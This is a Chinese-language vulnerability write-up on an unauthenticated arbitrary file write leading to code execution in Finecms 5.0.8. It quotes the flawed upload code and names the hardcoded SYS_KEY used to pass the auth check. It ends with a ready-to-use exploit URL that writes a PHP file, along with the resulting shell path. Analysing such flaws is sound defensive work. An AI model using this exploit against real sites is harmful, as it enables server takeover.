Finecms 5.0.8 任意代码执行漏洞
==============================

一、漏洞简介
------------

> auth值是由`zero_ci_session`中zero进行md5加密获取到的，无需登陆便有，且每个站点的站长会进行不同的自定义

二、漏洞影响
------------

Finecms 5.0.8

三、复现过程
------------

### 漏洞分析

在`/controllers/Api.php`中的data2函数，大约在第115行，有问题的代码大约在178行

    public function data2() {

        $data = array();

        // 安全码认证
        $auth = $this->input->get('auth', true);
        if ($auth != md5(SYS_KEY)) {
            // 授权认证码不正确
            $data = array('msg' => '授权认证码不正确', 'code' => 0);
        } else {
            // 解析数据
            $cache = '';
            $param = $this->input->get('param');
            if (isset($param['cache']) && $param['cache']) {
                $cache = md5(dr_array2string($param));
                $data = $this->get_cache_data($cache);
            }
            if (!$data) {

                if ($param == 'login') {
                    // 登录认证
                    $code = $this->member_model->login(
                        $this->input->get('username'),
                        $this->input->get('password'),
                        0, 1);
                    if (is_array($code)) {
                        $data = array(
                            'msg' => 'ok',
                            'code' => 1,
                            'return' => $this->member_model->get_member($code['uid'])
                        );
                    } elseif ($code == -1) {
                        $data = array('msg' => fc_lang('会员不存在'), 'code' => 0);
                    } elseif ($code == -2) {
                        $data = array('msg' => fc_lang('密码不正确'), 'code' => 0);
                    } elseif ($code == -3) {
                        $data = array('msg' => fc_lang('Ucenter注册失败'), 'code' => 0);
                    } elseif ($code == -4) {
                        $data = array('msg' => fc_lang('Ucenter：会员名称不合法'), 'code' => 0);
                    }
                } elseif ($param == 'update_avatar') {
                    // 更新头像
                    $uid = (int)$_REQUEST['uid'];
                    $file = $_REQUEST['file'];
                    //
                    // 创建图片存储文件夹
                    $dir = SYS_UPLOAD_PATH.'/member/'.$uid.'/';
                    @dr_dir_delete($dir);
                    if (!is_dir($dir)) {
                        dr_mkdirs($dir);
                    }
                    $file = str_replace(' ', '+', $file);
                    if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                        $new_file = $dir.'0x0.'.$result[2];
                        if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                            $data = array(
                                'msg' => '目录权限不足或磁盘已满',
                                'code' => 0
                            );
                        }

其中，首先

    $file = $_REQUEST['file'];

获取\$file变量

    if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                            $new_file = $dir.'0x0.'.$result[2];
                            if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                                $data = array(
                                    'msg' => '目录权限不足或磁盘已满',
                                    'code' => 0
                                );

然后用preg\_match函数进行正则匹配，因为\$file变量可控，所以\$result也是可控的，从而\$new\_file也是可控的，可以构造为php文件，然后

    file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file))))

对\$result\[1\]进行base64解码，然后写入\$new\_file文件中。显然，是可以任意写文件进行getshell的。所以，我们要让程序能够运行到这些代码，不能在之前就退出了。要经过

     $auth = $this->input->get('auth');
     if ($auth != md5(SYS_KEY))

SYS\_KEY被系统硬编码为24b16fede9a67c9251d3e7c7161c83ac，在`./WWW/config/system.php`中有定义。直接md5加密一次即可绕过

### 漏洞复现

    http://www.0-sec.org:88/index.php?c=api&m=data2&auth=目标站点值&param=update_avatar&file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+

无需登录，直接getshell,路径为

    http://www.0-sec.org:88/uploadfile/member/0/0x0.php

1.png

参考链接
--------

> http://4o4notfound.org/index.php/archives/40/
